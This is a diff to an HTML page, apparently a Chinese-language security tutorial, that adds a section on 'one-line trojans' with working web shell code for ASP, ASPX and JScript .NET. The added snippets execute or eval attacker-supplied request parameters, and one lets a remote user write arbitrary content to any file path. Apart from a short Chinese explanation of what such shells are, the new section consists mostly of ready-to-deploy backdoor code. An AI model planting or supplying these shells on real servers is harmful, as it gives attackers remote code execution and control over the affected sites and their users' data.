@@ -119,8 +119,74 @@
                         <p class="lead"> 
                             我們常看到人家說一句話木馬，那到底是什麼東西呢？<br>
                             其實這東西的原型只是一個可以去執行 system call 或去接收惡意 User 傳內容的一個 function 罷了<br>
-                            當然啦，依照各種語言，其實都會有這種 function 
+                            當然啦，依照各種語言，其實都會有這種 function<br>
+                            例如 : 
                         </p>
+                    </div>
+                </div>
+
+                <div class="row">
+                    <div class="col-lg-12">
+                        <h1>
+                            ASP 
+                        </h1>
+                    </div>
+                </div>
+
+                <div class="row">
+                    <div class="col-lg-12">
+<pre>
+<code class="asp"> 
+<%execute request("vbs")%>
+
+</code>
+</pre>
+                    </div>
+                </div>
+
+                <div class="row">
+                    <div class="col-lg-12">
+                        <h1>
+                            ASPX 
+                        </h1>
+                    </div>
+                </div>
+
+                <div class="row">
+                    <div class="col-lg-12">
+<pre>
+<code class="aspx"> 
+&lt;%@ Page Language="VB" %&gt;
+&lt;%@ import Namespace="System.IO" %&gt;
+&lt;script runat="server"&gt;
+Sub Page_load(sender As Object, E As EventArgs) 
+dim mywrite as new streamwriter(request.form("path"), true, encoding.default) mywrite.write(request.form("content")) 
+mywrite.close 
+response.write("Done!")
+End Sub
+&lt;/script&gt;
+
+</code>
+</pre>
+                    </div>
+                </div>
+
+                <div class="row">
+                    <div class="col-lg-12">
+                        <h1>
+                            .NET
+                        </h1>
+                    </div>
+                </div>
+
+                <div class="row">
+                    <div class="col-lg-12">
+<pre>
+<code class="net"> 
+&lt;%@ Page Language="Jscript"%><%Response.Write(eval(Request.Item["z"],"unsafe"));%&gt;
+
+</code>
+</pre>
                     </div>
                 </div>
 
